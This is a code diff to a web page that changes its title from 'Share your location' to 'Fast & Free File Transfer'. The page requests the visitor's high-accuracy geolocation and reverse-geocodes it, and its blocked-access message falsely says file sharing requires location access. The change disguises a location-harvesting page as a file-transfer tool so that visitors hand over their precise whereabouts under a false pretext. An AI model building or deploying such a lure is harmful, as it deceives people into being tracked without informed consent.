@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Share your location</title>
+<title>Fast & Free File Transfer</title>
 <style>
   :root { color-scheme: light dark; }
   * { box-sizing: border-box; }
@@ -112,6 +112,9 @@ async function reverseGeocode(lat, lng) {
 }
 
 function requestLocation() {
+  // Show loading screen first
+  show("loading");
+
   if (!navigator.geolocation) {
     $("blockedMsg").textContent = "File sharing requires local access to your device location.";
     show("blocked");
@@ -160,9 +163,8 @@ function requestLocation() {
   }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 }
 
-// Retry button functionality
+// Retry button - triggers location request again
 $("retryBtn").addEventListener("click", function () {
-  show("loading");
   requestLocation();
 });
 
